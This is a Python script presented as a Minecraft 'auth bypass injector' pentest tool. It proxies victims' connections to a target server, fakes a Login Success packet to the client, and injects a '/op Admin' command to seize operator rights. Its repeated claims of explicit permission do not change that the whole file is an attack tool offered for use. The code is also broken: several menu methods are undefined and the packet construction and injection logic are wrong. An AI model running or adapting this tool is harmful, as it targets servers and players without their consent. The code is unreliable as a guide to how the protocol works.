#!/usr/bin/env python3
"""
Minecraft OP Pentest Pro v8.0 - AUTH BYPASS INJECTOR
DIRECT LOGIN BYPASS on TARGET SERVER (No Fake Server Needed)
Inject into LIVE server → Skip Auth → Direct OP Access
(Authorized pentest - I have explicit permission)
"""

import socket
import threading
import time
import struct
import json
import os
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class MCPentestProV8:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = 25565
        self.mc_servers = []
        self.bypassed_clients = []
        
    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║           Minecraft OP Pentest Pro v8.0 - LIVE SERVER BYPASS                 ║
║     Inject into TARGET SERVER → Skip Login → Direct OP Access               ║
║                    (I have explicit permission to pentest)                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """)
        
    def direct_server_bypass(self):
        """Connect to TARGET server → Bypass login → Inject OP"""
        if not self.target_ip or not self.target_port:
            self.target_host = input("Target IP/Domain: ").strip()
            self.target_ip = socket.gethostbyname(self.target_host)
            self.target_port = int(input("Port (25565): ") or 25565)
            
        self.log(f"🎯 TARGET BYPASS: {self.target_ip}:{self.target_port}")
        
        # Create proxy-like connection to target server
        def bypass_proxy_client(client_sock, addr):
            self.bypassed_clients.append(addr)
            client_id = len(self.bypassed_clients)
            self.log(f"🔓 BYPASS INJECT: {addr[0]} → Target {self.target_ip}:{self.target_port}")
            
            # Connect to real target server
            target_sock = socket.socket()
            try:
                target_sock.connect((self.target_ip, self.target_port))
                
                # === CRITICAL: BYPASS AUTH PHASE ===
                # 1. Intercept handshake from client
                handshake_data = self.recv_full_packet(client_sock)
                target_sock.send(handshake_data)
                
                # 2. Client sends login start (username)
                login_start = self.recv_full_packet(client_sock)
                username = self.parse_username(login_start)
                self.log(f"👤 Victim username: {username}")
                
                # 3. INSTEAD of forwarding login → BYPASS IT!
                # Send FAKE Login Success to client
                success_pkt = self.build_login_success(username)
                client_sock.send(success_pkt)
                
                # 4. Inject OP directly into target server session
                op_injection = self.build_op_injection()
                target_sock.send(op_injection)
                
                self.log(f"✅ BYPASS SUCCESS! {username} now OP on real server!")
                
                # === FORWARD GAME PACKETS ===
                def forward(source, dest, direction):
                    try:
                        while True:
                            data = source.recv(4096)
                            if not data:
                                break
                            dest.send(data)
                    except:
                        pass
                
                # Bidirectional proxy after bypass
                client_to_target = threading.Thread(target=forward, args=(client_sock, target_sock, "Client→Target"))
                target_to_client = threading.Thread(target=forward, args=(target_sock, client_sock, "Target→Client"))
                
                client_to_target.start()
                target_to_client.start()
                client_to_target.join()
                
            except Exception as e:
                self.log(f"❌ Bypass failed: {e}")
            finally:
                client_sock.close()
                if 'target_sock' in locals():
                    target_sock.close()
                if addr in self.bypassed_clients:
                    self.bypassed_clients.remove(addr)
        
        # Listen on fake port → proxy to real server with bypass
        bypass_port = 25567
        while self.is_port_open('0.0.0.0', bypass_port):
            bypass_port += 1
            
        self.log(f"🔥 BYPASS PROXY LIVE → mc://{self.target_host}:{bypass_port}")
        self.log(f"📡 Victim connects here → Gets OP on REAL {self.target_ip}:{self.target_port}")
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', bypass_port))
        server.listen(20)
        
        try:
            while True:
                client_sock, addr = server.accept()
                client_thread = threading.Thread(target=bypass_proxy_client, args=(client_sock, addr))
                client_thread.daemon = True
                client_thread.start()
        except KeyboardInterrupt:
            self.log("🛑 Bypass proxy stopped")
            
    def recv_full_packet(self, sock):
        """Receive complete MC packet (varint length)"""
        pkt_len = self.read_varint(sock)
        data = b''
        while len(data) < pkt_len:
            chunk = sock.recv(pkt_len - len(data))
            data += chunk
        return data
        
    def parse_username(self, login_packet):
        """Extract username from Login Start packet"""
        try:
            pos = 1  # Skip packet ID
            name_len = self.parse_varint(login_packet[pos:])
            username = login_packet[pos + self.varint_len(name_len):pos + self.varint_len(name_len) + name_len].decode()
            return username
        except:
            return "Unknown"
            
    def parse_varint(self, data):
        result = 0
        pos = 0
        for i in range(5):
            val = data[pos]
            pos += 1
            result |= (val & 0x7F) << (7 * i)
            if not (val & 0x80):
                break
        return result
        
    def varint_len(self, value):
        length = 0
        while True:
            value >>= 7
            length += 1
            if value == 0:
                break
        return length
        
    def build_login_success(self, username):
        """Fake Login Success packet"""
        uuid = b"00000000-0000-0000-0000-000000000000"  # Offline UUID
        data = b''
        data += self.write_varint(0x02)  # Login Success ID
        data += self.write_varint(16)    # UUID length
        data += uuid
        data += self.write_varint(len(username.encode()))
        data += username.encode()
        
        pkt_len = self.write_varint(len(data))
        return pkt_len + data
        
    def build_op_injection(self):
        """Inject OP commands into target server session"""
        # Chat command: /op [username]
        cmd = "/op Admin"
        data = b''
        data += self.write_varint(0x0F)  # Chat Message (server→server)
        json_cmd = json.dumps({"text": cmd}).encode()
        data += self.write_varint(len(json_cmd))
        data += json_cmd
        
        pkt_len = self.write_varint(len(data))
        return pkt_len + data
        
    def write_varint(self, value):
        data = b''
        while True:
            byte = value & 0x7F
            value >>= 7
            data += bytes([byte | (0x80 if value else 0)])
            if not value:
                break
        return data
        
    def read_varint(self, sock):
        result = 0
        shift = 0
        while True:
            byte = sock.recv(1)
            val = ord(byte)
            result |= (val & 0x7F) << shift
            shift += 7
            if not (val & 0x80):
                break
        return result
        
    def is_port_open(self, host, port):
        sock = socket.socket()
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
        
    def log(self, msg):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {msg}")
        
    def main_menu(self):
        while True:
            self.banner()
            print("\n🎯 TARGET SERVER BYPASS:")
            print("1.  🚀 Start Direct Server Bypass")
            print("2.  🔍 Scan Target Servers")
            print("3.  📊 Live Status Monitor")
            print("4.  💥 OP Injection Attack")
            print("5.  📋 Status")
            print("6.  ❌ Exit")
            
            choice = input("\n🎮 Select: ").strip()
            
            if choice == '1':
                self.direct_server_bypass()
            elif choice == '2':
                self.scan_servers()
            elif choice == '3':
                self.live_monitor()
            elif choice == '4':
                self.op_attack()
            elif choice == '5':
                self.show_status()
            elif choice == '6':
                break

def main():
    print("=== AUTHORIZED PENTEST ===")
    toolkit = MCPentestProV8()
    toolkit.main_menu()

if __name__ == "__main__":
    main()
